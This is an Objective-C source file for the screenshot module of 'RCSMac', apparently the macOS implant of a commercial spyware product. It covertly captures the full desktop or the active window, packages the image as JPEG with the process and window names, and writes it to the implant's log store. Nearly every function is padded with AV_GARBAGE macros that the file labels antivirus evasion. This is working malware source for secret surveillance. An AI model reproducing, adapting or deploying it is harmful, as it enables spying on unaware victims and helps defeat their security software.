/*
 * RCSMac - Screenshot agent
 * 
 *
 * Created by Alfredo 'revenge' Pesoli on 23/04/2009
 *  Modified by Massimo Chiodini
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSMAgentScreenshot.h"

#import "RCSMCommon.h"
#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

static __m_MAgentScreenshot *sharedAgentScreenshot = nil;

// See SonOfGrab! http://developer.apple.com/samplecode/SonOfGrab/listing3.html

@interface __m_MAgentScreenshot (hidden)

- (BOOL)_grabScreenshot: (BOOL)entireDesktop;

@end

@implementation __m_MAgentScreenshot (hidden)

- (BOOL)_grabScreenshot: (BOOL)entireDesktop
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  screenshotAdditionalStruct *agentAdditionalHeader;
  
  CGImageRef screenShot;
  NSBitmapImageRep *bitmapRep;
  NSMutableData *imageData;
  NSString *processName;
  NSString *windowName;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (entireDesktop == YES) 
    {
      // AV evasion: only on release build
      AV_GARBAGE_001

      screenShot = CGWindowListCreateImage(CGRectInfinite,
                                           kCGWindowListOptionOnScreenOnly,
                                           kCGNullWindowID,
                                           kCGWindowImageDefault);   
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      processName = [[NSString alloc] initWithString: @"Desktop"];   
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      windowName  = [[NSString alloc] initWithString: @"Desktop"];
    }
  else 
    {   
      // AV evasion: only on release build
      AV_GARBAGE_004
    
      NSDictionary *windowInfo;
      
      //
      // Looks like it's better to wait at least a second in order to be sure
      // to get the window on the desktop in case of onProcess->Screenshot
      //
      sleep(1);
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if ((windowInfo = getActiveWindowInfo()) == nil)
        {
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          return NO;
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
        {  
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          return NO;
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      screenShot = CGWindowListCreateImage(CGRectNull,
                                           kCGWindowListOptionIncludingWindow,
                                           [[windowInfo objectForKey: @"windowID"] unsignedIntValue],
                                           kCGWindowImageBoundsIgnoreFraming);
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      processName = [[windowInfo objectForKey: @"processName"] retain];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      windowName  = [[windowInfo objectForKey: @"windowName"] retain];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      //[windowInfo release];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (screenShot == NULL)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001
    
      return NO;
    }
  
  bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *tempData = [bitmapRep representationUsingType: NSJPEGFileType
                                             properties: nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  imageData = [NSMutableData dataWithData: tempData];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  //
  // Fill in the agent additional header
  //
  NSMutableData *rawAdditionalHeader = [NSMutableData dataWithLength: sizeof(screenshotAdditionalStruct) +
                                                                      [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] +
                                                                      [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  int processNameLength = [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  int windowNameLength  = [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  agentAdditionalHeader = (screenshotAdditionalStruct *)[rawAdditionalHeader bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  agentAdditionalHeader->version = LOG_SCREENSHOT_VERSION;
  agentAdditionalHeader->processNameLength = processNameLength;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  agentAdditionalHeader->windowNameLength  = windowNameLength;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  // Unfortunately we have to use replaceBytesInRange and mess with size
  // instead of doing a raw appendData
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct), processNameLength)
                                 withBytes: [[processName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct) + processNameLength, windowNameLength)
                                 withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  BOOL success = [logManager createLog: AGENT_SCREENSHOT
                           agentHeader: rawAdditionalHeader
                             withLogID: 0];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if (success == TRUE)
    {      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      if ([logManager writeDataToLog: imageData
                            forAgent: AGENT_SCREENSHOT
                           withLogID: 0] == TRUE)
        {
#ifdef DEBUG_SCREENSHOT
          infoLog(@"data written correctly");
#endif        
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [logManager closeActiveLog: AGENT_SCREENSHOT
                       withLogID: 0];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [bitmapRep release];
  CGImageRelease(screenShot);
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [processName release];
  [windowName release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [outerPool release];
  return YES;
}

@end

@implementation __m_MAgentScreenshot

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentScreenshot *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentScreenshot;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        sharedAgentScreenshot = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentScreenshot;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (id)retain
{
  return self;
}

- (id)autorelease
{
  return self;
}

- (void)release
{
  // Do nothing
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (BOOL)stop
{
  int internalCounter = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= mSleepSec)
  {
    internalCounter++;
    sleep(1);
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return YES;
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  screenshotStruct *screenshotRawData;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  screenshotRawData = (screenshotStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  BOOL grabEntireDesktop = (screenshotRawData->grabActiveWindow == 0)  ? TRUE : FALSE;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [self _grabScreenshot: grabEntireDesktop];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];

  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [outerPool release];
}

- (BOOL)resume
{
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      [mAgentConfiguration release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return mAgentConfiguration;
}

@end
